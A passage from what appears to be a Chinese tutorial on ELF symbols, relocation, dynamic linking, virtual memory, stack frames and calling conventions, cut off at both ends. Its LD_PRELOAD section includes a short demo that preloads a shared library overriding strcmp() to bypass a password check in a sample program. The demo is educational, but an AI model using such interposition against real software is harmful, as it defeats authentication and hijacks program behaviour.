LOCAL DEFAULT ABS elfDemo.c 2: 00000000 0 SECTION LOCAL DEFAULT 2 3: 00000000 0 SECTION LOCAL DEFAULT 4 4: 00000000 0 SECTION LOCAL DEFAULT 5 5: 00000000 0 SECTION LOCAL DEFAULT 6 6: 00000004 4 OBJECT LOCAL DEFAULT 4 local_static_init_var.219 7: 00000000 4 OBJECT LOCAL DEFAULT 5 local_static_uninit_var.2 8: 00000000 0 SECTION LOCAL DEFAULT 7 9: 00000000 0 SECTION LOCAL DEFAULT 9 10: 00000000 0 SECTION LOCAL DEFAULT 10 11: 00000000 0 SECTION LOCAL DEFAULT 8 12: 00000000 0 SECTION LOCAL DEFAULT 1 13: 00000000 4 OBJECT GLOBAL DEFAULT 4 global_init_var 14: 00000004 4 OBJECT GLOBAL DEFAULT COM global_uninit_var 15: 00000000 46 FUNC GLOBAL DEFAULT 2 func 16: 00000000 0 FUNC GLOBAL HIDDEN 7 __x86.get_pc_thunk.ax 17: 00000000 0 NOTYPE GLOBAL DEFAULT UND _GLOBAL_OFFSET_TABLE_ 18: 00000000 0 NOTYPE GLOBAL DEFAULT UND printf 19: 0000002e 74 FUNC GLOBAL DEFAULT 2 main \u91cd\u5b9a\u4f4d \u91cd\u5b9a\u4f4d\u662f\u8fde\u63a5\u7b26\u53f7\u5b9a\u4e49\u4e0e\u7b26\u53f7\u5f15\u7528\u7684\u8fc7\u7a0b\u3002\u53ef\u91cd\u5b9a\u4f4d\u6587\u4ef6\u5fc5\u987b\u5177\u6709\u63cf\u8ff0\u5982\u4f55\u4fee\u6539\u6bb5\u5185\u5bb9\u7684\u4fe1\u606f\uff0c\u4ece\u800c\u8fd0\u884c\u53ef\u6267\u884c\u6587\u4ef6\u548c\u5171\u4eab\u5bf9\u8c61\u6587\u4ef6\u4fdd\u5b58\u8fdb\u7a0b\u7a0b\u5e8f\u6620\u50cf\u7684\u6b63\u786e\u4fe1\u606f\u3002 typedef struct { Elf32_Addr r_offset; /* Address */ Elf32_Word r_info; /* Relocation type and symbol index */ } Elf32_Rel; typedef struct { Elf64_Addr r_offset; /* Address */ Elf64_Xword r_info; /* Relocation type and symbol index */ Elf64_Sxword r_addend; /* Addend */ } Elf64_Rela; \u67e5\u770b\u91cd\u5b9a\u4f4d\u8868\uff1a $ readelf -r elfDemo.o Relocation section '.rel.text' at offset 0x338 contains 9 entries: Offset Info Type Sym.Value Sym. Name 00000008 00001002 R_386_PC32 00000000 __x86.get_pc_thunk.ax 0000000d 0000110a R_386_GOTPC 00000000 _GLOBAL_OFFSET_TABLE_ 00000019 00000509 R_386_GOTOFF 00000000 .rodata 00000021 00001204 R_386_PLT32 00000000 printf 00000040 00001002 R_386_PC32 00000000 __x86.get_pc_thunk.ax 00000045 0000110a R_386_GOTPC 00000000 _GLOBAL_OFFSET_TABLE_ 00000052 00000d09 R_386_GOTOFF 00000000 global_init_var 0000005d 00000309 R_386_GOTOFF 00000000 .data 00000068 00000f02 R_386_PC32 00000000 func Relocation section '.rel.eh_frame' at offset 0x380 contains 3 entries: Offset Info Type Sym.Value Sym. Name 00000020 00000202 R_386_PC32 00000000 .text 00000044 00000202 R_386_PC32 00000000 .text 00000070 00000802 R_386_PC32 00000000 .text.__x86.get_pc_thu \u52a8\u6001\u94fe\u63a5 \u52a8\u6001\u94fe\u63a5\u76f8\u5173\u7684\u73af\u5883\u53d8\u91cf \u52a8\u6001\u94fe\u63a5\u76f8\u5173\u7684\u73af\u5883\u53d8\u91cf LD_PRELOAD LD_PRELOAD \u73af\u5883\u53d8\u91cf\u53ef\u4ee5\u5b9a\u4e49\u5728\u7a0b\u5e8f\u8fd0\u884c\u524d\u4f18\u5148\u52a0\u8f7d\u7684\u52a8\u6001\u94fe\u63a5\u5e93\u3002\u8fd9\u4f7f\u5f97\u6211\u4eec\u53ef\u4ee5\u6709\u9009\u62e9\u6027\u5730\u52a0\u8f7d\u4e0d\u540c\u52a8\u6001\u94fe\u63a5\u5e93\u4e2d\u7684\u76f8\u540c\u51fd\u6570\uff0c\u5373\u901a\u8fc7\u8bbe\u7f6e\u8be5\u53d8\u91cf\uff0c\u5728\u4e3b\u7a0b\u5e8f\u548c\u5176\u52a8\u6001\u94fe\u63a5\u5e93\u4e2d\u95f4\u52a0\u8f7d\u522b\u7684\u52a8\u6001\u94fe\u63a5\u5e93\uff0c\u751a\u81f3\u8986\u76d6\u539f\u672c\u7684\u5e93\u3002\u8fd9\u5c31\u6709\u53ef\u80fd\u51fa\u73b0\u52ab\u6301\u7a0b\u5e8f\u6267\u884c\u7684\u5b89\u5168\u95ee\u9898\u3002 #include<stdio.h> #include<string.h> void main() { char passwd[] = \"password\"; char str[128]; scanf(\"%s\", &str); if (!strcmp(passwd, str)) { printf(\"correct\\n\"); return; } printf(\"invalid\\n\"); } \u4e0b\u9762\u6211\u4eec\u6784\u9020\u4e00\u4e2a\u6076\u610f\u7684\u52a8\u6001\u94fe\u63a5\u5e93\u6765\u91cd\u8f7d strcmp() \u51fd\u6570\uff0c\u7f16\u8bd1\u4e3a\u52a8\u6001\u94fe\u63a5\u5e93\uff0c\u5e76\u8bbe\u7f6e LD_PRELOAD \u73af\u5883\u53d8\u91cf\uff1a $ cat hack.c #include<stdio.h> #include<stdio.h> int strcmp(const char *s1, const char *s2) { printf(\"hacked\\n\"); return 0; } $ gcc -shared -o hack.so hack.c $ gcc ldpreload.c $ ./a.out asdf invalid $ LD_PRELOAD=\"./hack.so\" ./a.out asdf hacked correct LD_SHOW_AUXV AUXV \u662f\u5185\u6838\u5728\u6267\u884c ELF \u6587\u4ef6\u65f6\u4f20\u9012\u7ed9\u7528\u6237\u7a7a\u95f4\u7684\u4fe1\u606f\uff0c\u8bbe\u7f6e\u8be5\u73af\u5883\u53d8\u91cf\u53ef\u4ee5\u663e\u793a\u8fd9\u4e9b\u4fe1\u606f\u3002\u5982\uff1a $ LD_SHOW_AUXV=1 ls AT_SYSINFO_EHDR: 0x7fff41fbc000 AT_HWCAP: bfebfbff AT_PAGESZ: 4096 AT_CLKTCK: 100 AT_PHDR: 0x55f1f623e040 AT_PHENT: 56 AT_PHNUM: 9 AT_BASE: 0x7f277e1ec000 AT_FLAGS: 0x0 AT_ENTRY: 0x55f1f6243060 AT_UID: 1000 AT_EUID: 1000 AT_GID: 1000 AT_EGID: 1000 AT_SECURE: 0 AT_RANDOM: 0x7fff41effbb9 AT_EXECFN: /usr/bin/ls AT_PLATFORM: x86_64 \u5185\u5b58\u7ba1\u7406 \u4ec0\u4e48\u662f\u5185\u5b58 \u6808\u4e0e\u8c03\u7528\u7ea6\u5b9a \u5806\u4e0e\u5185\u5b58\u7ba1\u7406 \u4ec0\u4e48\u662f\u5185\u5b58 \u4e3a\u4e86\u4f7f\u7528\u6237\u7a0b\u5e8f\u5728\u8fd0\u884c\u65f6\u5177\u6709\u4e00\u4e2a\u79c1\u6709\u7684\u5730\u5740\u7a7a\u95f4\u3001\u6709\u81ea\u5df1\u7684 CPU\uff0c\u5c31\u50cf\u72ec\u5360\u4e86\u6574\u4e2a\u8ba1\u7b97\u673a\u4e00\u6837\uff0c\u73b0\u4ee3\u64cd\u4f5c\u7cfb\u7edf\u63d0\u51fa\u4e86\u865a\u62df\u5185\u5b58\u7684\u6982\u5ff5\u3002 \u865a\u62df\u5185\u5b58\u7684\u4e3b\u8981\u4f5c\u7528\u4e3b\u8981\u4e3a\u4e09\u4e2a\uff1a \u5b83\u5c06\u5185\u5b58\u770b\u505a\u4e00\u4e2a\u5b58\u50a8\u5728\u78c1\u76d8\u4e0a\u7684\u5730\u5740\u7a7a\u95f4\u7684\u9ad8\u901f\u7f13\u5b58\uff0c\u5728\u5185\u5b58\u4e2d\u53ea\u4fdd\u5b58\u6d3b\u52a8\u533a\u57df\uff0c\u5e76\u6839\u636e\u9700\u8981\u5728\u78c1\u76d8\u548c\u5185\u5b58\u4e4b\u95f4\u6765\u56de\u4f20\u9001\u6570\u636e\u3002 \u5b83\u4e3a\u6bcf\u4e2a\u8fdb\u7a0b\u63d0\u4f9b\u4e86\u4e00\u81f4\u7684\u5730\u5740\u7a7a\u95f4\u3002 \u5b83\u4fdd\u62a4\u4e86\u6bcf\u4e2a\u8fdb\u7a0b\u7684\u5730\u5740\u7a7a\u95f4\u4e0d\u88ab\u5176\u4ed6\u8fdb\u7a0b\u7834\u574f\u3002 \u73b0\u4ee3\u64cd\u4f5c\u7cfb\u7edf\u91c7\u7528\u865a\u62df\u5bfb\u5740\u7684\u65b9\u5f0f\uff0cCPU \u901a\u8fc7\u751f\u6210\u4e00\u4e2a\u865a\u62df\u5730\u5740\uff08Virtual Address(VA)\uff09\u6765\u8bbf\u95ee\u5185\u5b58\uff0c\u7136\u540e\u8fd9\u4e2a\u865a\u62df\u5730\u5740\u901a\u8fc7\u5185\u5b58\u7ba1\u7406\u5355\u5143\uff08Memory Management Unit(MMU)\uff09\u8f6c\u6362\u6210\u7269\u7406\u5730\u5740\u4e4b\u540e\u88ab\u9001\u5230\u5b58\u50a8\u5668\u3002 \u524d\u9762\u6211\u4eec\u5df2\u7ecf\u770b\u5230\u53ef\u6267\u884c\u6587\u4ef6\u88ab\u6620\u5c04\u5230\u4e86\u5185\u5b58\u4e2d\uff0cLinux \u4e3a\u6bcf\u4e2a\u8fdb\u7a0b\u7ef4\u6301\u4e86\u4e00\u4e2a\u5355\u72ec\u7684\u865a\u62df\u5730\u5740\u7a7a\u95f4\uff0c\u5305\u62ec\u4e86 .text\u3001.data\u3001.bss\u3001\u6808\uff08stack\uff09\u3001\u5806\uff08heap\uff09\uff0c\u5171\u4eab\u5e93\u7b49\u5185\u5bb9\u3002 32 \u4f4d\u7cfb\u7edf\u6709 4GB \u7684\u5730\u5740\u7a7a\u95f4\uff0c\u5176\u4e2d 0x08048000~0xbfffffff \u662f\u7528\u6237\u7a7a\u95f4\uff083GB\uff09\uff0c0xc0000000~0xffffffff \u662f\u5185\u6838\u7a7a\u95f4\uff08\uff11GB\uff09\u3002 \u6808\u4e0e\u8c03\u7528\u7ea6\u5b9a \u6808 \u6808\u662f\u4e00\u4e2a\u5148\u5165\u540e\u51fa\uff08First In Last Out(FIFO)\uff09\u7684\u5bb9\u5668\u3002\u7528\u4e8e\u5b58\u653e\u51fd\u6570\u8fd4\u56de\u5730\u5740\u53ca\u53c2\u6570\u3001\u4e34\u65f6\u53d8\u91cf\u548c\u6709\u5173\u4e0a\u4e0b\u6587\u7684\u5185\u5bb9\u3002\u7a0b\u5e8f\u5728\u8c03\u7528\u51fd\u6570\u65f6\uff0c\u64cd\u4f5c\u7cfb\u7edf\u4f1a\u81ea\u52a8\u901a\u8fc7\u538b\u6808\u548c\u5f39\u6808\u5b8c\u6210\u4fdd\u5b58\u51fd\u6570\u73b0\u573a\u7b49\u64cd\u4f5c\uff0c\u4e0d\u9700\u8981\u7a0b\u5e8f\u5458\u624b\u52a8\u5e72\u9884\u3002 \u6808\u7531\u9ad8\u5730\u5740\u5411\u4f4e\u5730\u5740\u589e\u957f\uff0c\u6808\u4fdd\u5b58\u4e86\u4e00\u4e2a\u51fd\u6570\u8c03\u7528\u6240\u9700\u8981\u7684\u7ef4\u62a4\u4fe1\u606f\uff0c\u79f0\u4e3a\u5806\u6808\u5e27\uff08Stack Frame\uff09\u5728 x86 \u4f53\u7cfb\u4e2d\uff0c\u5bc4\u5b58\u5668 ebp \u6307\u5411\u5806\u6808\u5e27\u7684\u5e95\u90e8\uff0c esp \u6307\u5411\u5806\u6808\u5e27\u7684\u9876\u90e8\u3002\u538b\u6808\u65f6\u6808\u9876\u5730\u5740\u51cf\u5c0f\uff0c\u5f39\u6808\u65f6\u6808\u9876\u5730\u5740\u589e\u5927\u3002 PUSH \uff1a\u7528\u4e8e\u538b\u6808\u3002\u5c06 esp \u51cf 4\uff0c\u7136\u540e\u5c06\u5176\u552f\u4e00\u64cd\u4f5c\u6570\u7684\u5185\u5bb9\u5199\u5165\u5230 esp \u6307\u5411\u7684\u5185\u5b58\u5730\u5740 POP \uff1a\u7528\u4e8e\u5f39\u6808\u3002\u4ece esp \u6307\u5411\u7684\u5185\u5b58\u5730\u5740\u83b7\u5f97\u6570\u636e\uff0c\u5c06\u5176\u52a0\u8f7d\u5230\u6307\u4ee4\u64cd\u4f5c\u6570\uff08\u901a\u5e38\u662f\u4e00\u4e2a\u5bc4\u5b58\u5668\uff09\u4e2d\uff0c\u7136\u540e\u5c06 esp \u52a0 4\u3002 x86 \u4f53\u7cfb\u4e0b\u51fd\u6570\u7684\u8c03\u7528\u603b\u662f\u8fd9\u6837\u7684\uff1a \u628a\u6240\u6709\u6216\u4e00\u90e8\u5206\u53c2\u6570\u538b\u5165\u6808\u4e2d\uff0c\u5982\u679c\u6709\u5176\u4ed6\u53c2\u6570\u6ca1\u6709\u5165\u6808\uff0c\u90a3\u4e48\u4f7f\u7528\u67d0\u4e9b\u7279\u5b9a\u7684\u5bc4\u5b58\u5668\u4f20\u9012\u3002 \u628a\u5f53\u524d\u6307\u4ee4\u7684\u4e0b\u4e00\u6761\u6307\u4ee4\u7684\u5730\u5740\u538b\u5165\u6808\u4e2d\u3002 \u8df3\u8f6c\u5230\u51fd\u6570\u4f53\u6267\u884c\u3002 \u5176\u4e2d\u7b2c 2 \u6b65\u548c\u7b2c 3 \u6b65\u7531\u6307\u4ee4 call \u4e00\u8d77\u6267\u884c\u3002\u8df3\u8f6c\u5230\u51fd\u6570\u4f53\u4e4b\u540e\u5373\u5f00\u59cb\u6267\u884c\u51fd\u6570\uff0c\u800c x86 \u51fd\u6570\u4f53\u7684\u5f00\u5934\u662f\u8fd9\u6837\u7684\uff1a push ebp \uff1a\u628aebp\u538b\u5165\u6808\u4e2d\uff08old ebp\uff09\u3002 mov ebp, esp \uff1aebp=esp\uff08\u8fd9\u65f6ebp\u6307\u5411\u6808\u9876\uff0c\u800c\u6b64\u65f6\u6808\u9876\u5c31\u662fold ebp\uff09 [\u53ef\u9009] sub esp, XXX \uff1a\u5728\u6808\u4e0a\u5206\u914d XXX \u5b57\u8282\u7684\u4e34\u65f6\u7a7a\u95f4\u3002 [\u53ef\u9009] push XXX \uff1a\u4fdd\u5b58\u540d\u4e3a XXX \u7684\u5bc4\u5b58\u5668\u3002 \u628aebp\u538b\u5165\u6808\u4e2d\uff0c\u662f\u4e3a\u4e86\u5728\u51fd\u6570\u8fd4\u56de\u65f6\u6062\u590d\u4ee5\u524d\u7684ebp\u503c\uff0c\u800c\u538b\u5165\u5bc4\u5b58\u5668\u7684\u503c\uff0c\u662f\u4e3a\u4e86\u4fdd\u6301\u67d0\u4e9b\u5bc4\u5b58\u5668\u5728\u51fd\u6570\u8c03\u7528\u524d\u540e\u4fdd\u5b58\u4e0d\u53d8\u3002\u51fd\u6570\u8fd4\u56de\u65f6\u7684\u64cd\u4f5c\u4e0e\u5f00\u5934\u6b63\u597d\u76f8\u53cd\uff1a [\u53ef\u9009] pop XXX \uff1a\u6062\u590d\u4fdd\u5b58\u7684\u5bc4\u5b58\u5668\u3002 mov esp, ebp \uff1a\u6062\u590desp\u540c\u65f6\u56de\u6536\u5c40\u90e8\u53d8\u91cf\u7a7a\u95f4\u3002 pop ebp \uff1a\u6062\u590d\u4fdd\u5b58\u7684ebp\u7684\u503c\u3002 ret \uff1a\u4ece\u6808\u4e2d\u53d6\u5f97\u8fd4\u56de\u5730\u5740\uff0c\u5e76\u8df3\u8f6c\u5230\u8be5\u4f4d\u7f6e\u3002 \u6808\u5e27\u5bf9\u5e94\u7684\u6c47\u7f16\u4ee3\u7801\uff1a PUSH ebp ; \u51fd\u6570\u5f00\u59cb\uff08\u4f7f\u7528ebp\u524d\u5148\u628a\u5df2\u6709\u503c\u4fdd\u5b58\u5230\u6808\u4e2d\uff09 MOV ebp, esp ; \u4fdd\u5b58\u5f53\u524desp\u5230ebp\u4e2d ... ; \u51fd\u6570\u4f53 ; \u65e0\u8bbaesp\u503c\u5982\u4f55\u53d8\u5316\uff0cebp\u90fd\u4fdd\u6301\u4e0d\u53d8\uff0c\u53ef\u4ee5\u5b89\u5168\u8bbf\u95ee\u51fd\u6570\u7684\u5c40\u90e8\u53d8\u91cf\u3001\u53c2\u6570 MOV esp, ebp ; \u5c06\u51fd\u6570\u7684\u5176\u5b9e\u5730\u5740\u8fd4\u56de\u5230esp\u4e2d POP ebp ; \u51fd\u6570\u8fd4\u56de\u524d\u5f39\u51fa\u4fdd\u5b58\u5728\u6808\u4e2d\u7684ebp\u503c RET ; \u51fd\u6570\u8fd4\u56de\u5e76\u8df3\u8f6c \u51fd\u6570\u8c03\u7528\u540e\u6808\u7684\u6807\u51c6\u5e03\u5c40\u5982\u4e0b\u56fe\uff1a \u6211\u4eec\u6765\u770b\u4e00\u4e2a\u4f8b\u5b50\uff1a \u6e90\u7801 #include<stdio.h> int add(int a, int b) { int x = a, y = b; return (x + y); } int main() { int a = 1, b = 2; printf(\"%d\\n\", add(a, b)); return 0; } \u4f7f\u7528 gdb \u67e5\u770b\u5bf9\u5e94\u7684\u6c47\u7f16\u4ee3\u7801\uff0c\u8fd9\u91cc\u6211\u4eec\u7ed9\u51fa\u4e86\u8be6\u7ec6\u7684\u6ce8\u91ca\uff1a gdb-peda$ disassemble main Dump of assembler code for function main: 0x00000563 <+0>: lea ecx,[esp+0x4] ;\u5c06 esp+0x4 \u7684\u5730\u5740\u4f20\u7ed9 ecx 0x00000567 <+4>: and esp,0xfffffff0 ;\u6808 16 \u5b57\u8282\u5bf9\u9f50 0x0000056a <+7>: push DWORD PTR [ecx-0x4] ;ecx-0x4\uff0c\u5373\u539f esp \u5f3a\u5236\u8f6c\u6362\u4e3a\u53cc\u5b57\u6570\u636e\u540e\u538b\u5165\u6808\u4e2d 0x0000056d <+10>: push ebp ;\u4fdd\u5b58\u8c03\u7528 main() \u51fd\u6570\u4e4b\u524d\u7684 ebp\uff0c\u7531\u4e8e\u5728 _start \u4e2d\u5c06 ebp \u6e05\u96f6\u4e86\uff0c\u8fd9\u91cc\u7684 ebp=0x0 0x0000056e <+11>: mov ebp,esp ;\u628a\u8c03\u7528 main() \u4e4b\u524d\u7684 esp \u4f5c\u4e3a\u5f53\u524d\u6808\u5e27\u7684 ebp 0x00000570 <+13>: push ebx ;ebx\u3001ecx \u5165\u6808 0x00000571 <+14>: push ecx 0x00000572 <+15>: sub esp,0x10 ;\u4e3a\u5c40\u90e8\u53d8\u91cf a\u3001b \u5206\u914d\u7a7a\u95f4\u5e76\u505a\u5230 16 \u5b57\u8282\u5bf9\u9f50 0x00000575 <+18>: call 0x440 <__x86.get_pc_thunk.bx> ;\u8c03\u7528 <__x86.get_pc_thunk.bx> \u51fd\u6570\uff0c\u5c06 esp \u5f3a\u5236\u8f6c\u6362\u4e3a\u53cc\u5b57\u6570\u636e\u540e\u4fdd\u5b58\u5230 ebx 0x0000057a <+23>: add ebx,0x1a86 ;ebx+0x1a86 0x00000580 <+29>: mov DWORD PTR [ebp-0x10],0x1 ;a \u7b2c\u4e8c\u4e2a\u5165\u6808\u6240\u4ee5\u4fdd\u5b58\u5728 ebp-0x10 \u7684\u4f4d\u7f6e\uff0c\u6b64\u53e5\u5373 a=1 0x00000587 <+36>: mov DWORD PTR [ebp-0xc],0x2 ;b \u7b2c\u4e00\u4e2a\u5165\u6808\u6240\u4ee5\u4fdd\u5b58\u5728 ebp-0xc \u7684\u4f4d\u7f6e\uff0c\u6b64\u53e5\u5373 b=2 0x0000058e <+43>: push DWORD PTR [ebp-0xc] ;\u5c06 b \u538b\u5165\u6808\u4e2d 0x00000591 <+46>: push DWORD PTR [ebp-0x10] ;\u5c06 a \u538b\u5165\u6808\u4e2d 0x00000594 <+49>: call 0x53d <add> ;\u8c03\u7528 add() \u51fd\u6570\uff0c\u8fd4\u56de\u503c\u4fdd\u5b58\u5728 eax \u4e2d 0x00000599 <+54>: add esp,0x8 ;\u6e05\u7406 add() \u7684\u53c2\u6570 0x0000059c <+57>: sub esp,0x8 ;\u8c03\u6574 esp \u4f7f 16 \u4f4d\u5bf9\u9f50 0x0000059f <+60>: push eax ;eax \u5165\u6808 0x000005a0 <+61>: lea eax,[ebx-0x19b0] ;ebx-0x19b0 \u7684\u5730\u5740\u4fdd\u5b58\u5230 eax\uff0c\u8be5\u5730\u5740\u5904\u4fdd\u5b58\u5b57\u7b26\u4e32 \"%d\\n\" 0x000005a6 <+67>: push eax ;eax \u5165\u6808 0x000005a7 <+68>: call 0x3d0 <printf@plt> ;\u8c03\u7528 printf() \u51fd\u6570 0x000005ac <+73>: add esp,0x10 ;\u8c03\u6574\u6808\u9876\u6307\u9488 esp\uff0c\u6e05\u7406 printf() \u7684\u53c2\u6570 0x000005af <+76>: mov eax,0x0 ;eax=0x0 0x000005b4 <+81>: lea esp,[ebp-0x8] ;ebp-0x8 \u7684\u5730\u5740\u4fdd\u5b58\u5230 esp 0x000005b7 <+84>: pop ecx ;\u5f39\u6808\u6062\u590d ecx\u3001ebx\u3001ebp 0x000005b8 <+85>: pop ebx 0x000005b9 <+86>: pop ebp 0x000005ba <+87>: lea esp,[ecx-0x4] ;ecx-0x4 \u7684\u5730\u5740\u4fdd\u5b58\u5230 esp 0x000005bd <+90>: ret ;\u8fd4\u56de\uff0c\u76f8\u5f53\u4e8e pop eip; End of assembler dump. gdb-peda$ disassemble add Dump of assembler code for function add: 0x0000053d <+0>: push ebp ;\u4fdd\u5b58\u8c03\u7528 add() \u51fd\u6570\u4e4b\u524d\u7684 ebp 0x0000053e <+1>: mov ebp,esp ;\u628a\u8c03\u7528 add() \u4e4b\u524d\u7684 esp \u4f5c\u4e3a\u5f53\u524d\u6808\u5e27\u7684 ebp 0x00000540 <+3>: sub esp,0x10 ;\u4e3a\u5c40\u90e8\u53d8\u91cf x\u3001y \u5206\u914d\u7a7a\u95f4\u5e76\u505a\u5230 16 \u5b57\u8282\u5bf9\u9f50 0x00000543 <+6>: call 0x5be <__x86.get_pc_thunk.ax> ;\u8c03\u7528 <__x86.get_pc_thunk.ax> \u51fd\u6570\uff0c\u5c06 esp \u5f3a\u5236\u8f6c\u6362\u4e3a\u53cc\u5b57\u6570\u636e\u540e\u4fdd\u5b58\u5230 eax 0x00000548 <+11>: add eax,0x1ab8 ;eax+0x1ab8 0x0000054d <+16>: mov eax,DWORD PTR [ebp+0x8] ;\u5c06 ebp+0x8 \u7684\u6570\u636e 0x1 \u4f20\u9001\u5230 eax\uff0cebp+0x4 \u4e3a\u51fd\u6570\u8fd4\u56de\u5730\u5740 0x00000550 <+19>: mov DWORD PTR [ebp-0x8],eax ;\u4fdd\u5b58 eax \u7684\u503c 0x1 \u5230 ebp-0x8 \u7684\u4f4d\u7f6e 0x00000553 <+22>: mov eax,DWORD PTR [ebp+0xc] ;\u5c06 ebp+0xc \u7684\u6570\u636e 0x2 \u4f20\u9001\u5230 eax 0x00000556 <+25>: mov DWORD PTR [ebp-0x4],eax ;\u4fdd\u5b58 eax \u7684\u503c 0x2 \u5230 ebp-0x4 \u7684\u4f4d\u7f6e 0x00000559 <+28>: mov edx,DWORD PTR [ebp-0x8] ;\u53d6\u51fa ebp-0x8 \u7684\u503c 0x1 \u5230 edx 0x0000055c <+31>: mov eax,DWORD PTR [ebp-0x4] ;\u53d6\u51fa ebp-0x4 \u7684\u503c 0x2 \u5230 eax 0x0000055f <+34>: add eax,edx ;eax+edx 0x00000561 <+36>: leave ;\u8fd4\u56de\uff0c\u76f8\u5f53\u4e8e mov esp,ebp; pop ebp; 0x00000562 <+37>: ret End of assembler dump. \u8fd9\u91cc\u6211\u4eec\u5728 Linux \u73af\u5883\u4e0b\uff0c\u7531\u4e8e ELF \u6587\u4ef6\u7684\u5165\u53e3\u5176\u5b9e\u662f _start \u800c\u4e0d\u662f main() \uff0c\u6240\u4ee5\u6211\u4eec\u8fd8\u5e94\u8be5\u5173\u6ce8\u4e0b\u9762\u7684\u51fd\u6570\uff1a gdb-peda$ disassemble _start Dump of assembler code for function _start: 0x00000400 <+0>: xor ebp,ebp ;\u6e05\u96f6 ebp\uff0c\u8868\u793a\u4e0b\u9762\u7684 main() \u51fd\u6570\u6808\u5e27\u4e2d ebp \u4fdd\u5b58\u7684\u4e0a\u4e00\u7ea7 ebp \u4e3a 0x00000000 0x00000402 <+2>: pop esi ;\u5c06 argc \u5b58\u5165 esi 0x00000403 <+3>: mov ecx,esp ;\u5c06\u6808\u9876\u5730\u5740\uff08argv \u548c env \u6570\u7ec4\u7684\u5176\u5b9e\u5730\u5740\uff09\u4f20\u7ed9 ecx 0x00000405 <+5>: and esp,0xfffffff0 ;\u6808 16 \u5b57\u8282\u5bf9\u9f50 0x00000408 <+8>: push eax ;eax\u3001esp\u3001edx \u5165\u6808 0x00000409 <+9>: push esp 0x0000040a <+10>: push edx 0x0000040b <+11>: call 0x432 <_start+50> ;\u5148\u5c06\u4e0b\u4e00\u6761\u6307\u4ee4\u5730\u5740 0x00000410 \u538b\u6808\uff0c\u8bbe\u7f6e esp \u6307\u5411\u5b83\uff0c\u518d\u8c03\u7528 0x00000432 \u5904\u7684\u6307\u4ee4 0x00000410 <+16>: add ebx,0x1bf0 ;ebx+0x1bf0 0x00000416 <+22>: lea eax,[ebx-0x19d0] ;\u53d6 <__libc_csu_fini> \u5730\u5740\u4f20\u7ed9 eax\uff0c\u7136\u540e\u538b\u6808 0x0000041c <+28>: push eax 0x0000041d <+29>: lea eax,[ebx-0x1a30] ;\u53d6 <__libc_csu_init> \u5730\u5740\u4f20\u5165 eax\uff0c\u7136\u540e\u538b\u6808 0x00000423 <+35>: push eax 0x00000424 <+36>: push ecx ;ecx\u3001esi \u5165\u6808\u4fdd\u5b58 0x00000425 <+37>: push esi 0x00000426 <+38>: push DWORD PTR [ebx-0x8] ;\u8c03\u7528 main() \u51fd\u6570\u4e4b\u524d\u4fdd\u5b58\u8fd4\u56de\u5730\u5740\uff0c\u5176\u5b9e\u5c31\u662f\u4fdd\u5b58 main() \u51fd\u6570\u7684\u5165\u53e3\u5730\u5740 0x0000042c <+44>: call 0x3e0 <__libc_start_main@plt> ;call \u6307\u4ee4\u8c03\u7528 __libc_start_main \u51fd\u6570 0x00000431 <+49>: hlt ;hlt \u6307\u4ee4\u4f7f\u7a0b\u5e8f\u505c\u6b62\u8fd0\u884c\uff0c\u5904\u7406\u5668\u8fdb\u5165\u6682\u505c\u72b6\u6001\uff0c\u4e0d\u6267\u884c\u4efb\u4f55\u64cd\u4f5c\uff0c\u4e0d\u5f71\u54cd\u6807\u5fd7\u3002\u5f53 RESET \u7ebf\u4e0a\u6709\u590d\u4f4d\u4fe1\u53f7\u3001CPU \u54cd\u5e94\u975e\u5c4f\u853d\u7ec8\u7aef\u3001CPU \u54cd\u5e94\u53ef\u5c4f\u853d\u7ec8\u7aef 3 \u79cd\u60c5\u51b5\u4e4b\u4e00\u65f6\uff0cCPU \u8131\u79bb\u6682\u505c\u72b6\u6001\uff0c\u6267\u884c\u4e0b\u4e00\u6761\u6307\u4ee4 0x00000432 <+50>: mov ebx,DWORD PTR [esp] ;esp \u5f3a\u5236\u8f6c\u6362\u4e3a\u53cc\u5b57\u6570\u636e\u540e\u4fdd\u5b58\u5230 ebx 0x00000435 <+53>: ret ;\u8fd4\u56de\uff0c\u76f8\u5f53\u4e8e pop eip; 0x00000436 <+54>: xchg ax,ax ;\u4ea4\u6362 ax \u548c ax \u7684\u6570\u636e\uff0c\u76f8\u5f53\u4e8e nop 0x00000438 <+56>: xchg ax,ax 0x0000043a <+58>: xchg ax,ax 0x0000043c <+60>: xchg ax,ax 0x0000043e <+62>: xchg ax,ax End of assembler dump. \u51fd\u6570\u8c03\u7528\u7ea6\u5b9a \u51fd\u6570\u8c03\u7528\u7ea6\u5b9a\u662f\u5bf9\u51fd\u6570\u8c03\u7528\u65f6\u5982\u4f55\u4f20\u9012\u53c2\u6570\u7684\u4e00\u79cd\u7ea6\u5b9a\u3002\u8c03\u7528\u51fd\u6570\u524d\u8981\u5148\u628a\u53c2\u6570\u538b\u5165\u6808\u7136\u540e\u518d\u4f20\u9012\u7ed9\u51fd\u6570\u3002 \u4e00\u4e2a\u8c03\u7528\u7ea6\u5b9a\u5927\u6982\u6709\u5982\u4e0b\u7684\u5185\u5bb9\uff1a \u51fd\u6570\u53c2\u6570\u7684\u4f20\u9012\u987a\u5e8f\u548c\u65b9\u5f0f \u6808\u7684\u7ef4\u62a4\u65b9\u5f0f \u540d\u5b57\u4fee\u9970\u7684\u7b56\u7565 \u4e3b\u8981\u7684\u51fd\u6570\u8c03\u7528\u7ea6\u5b9a\u5982\u4e0b\uff0c\u5176\u4e2d cdecl \u662f C \u8bed\u8a00\u9ed8\u8ba4\u7684\u8c03\u7528\u7ea6\u5b9a\uff1a \u8c03\u7528\u7ea6\u5b9a \u51fa\u6808\u65b9 \u53c2\u6570\u4f20\u9012 \u540d\u5b57\u4fee\u9970 cdecl \u51fd\u6570\u8c03\u7528\u65b9 \u4ece\u53f3\u5230\u5de6\u7684\u987a\u5e8f\u538b\u53c2\u6570\u5165\u6808 \u4e0b\u5212\u7ebf\uff0b\u51fd\u6570\u540d stdcall \u51fd\u6570\u672c\u8eab \u4ece\u53f3\u5230\u5de6\u7684\u987a\u5e8f\u538b\u53c2\u6570\u5165\u6808 \u4e0b\u5212\u7ebf\uff0b\u51fd\u6570\u540d\uff0b@\uff0b\u53c2\u6570\u7684\u5b57\u8282\u6570 fastcall \u51fd\u6570\u672c\u8eab \u90fd\u4e24\u4e2a DWORD\uff084 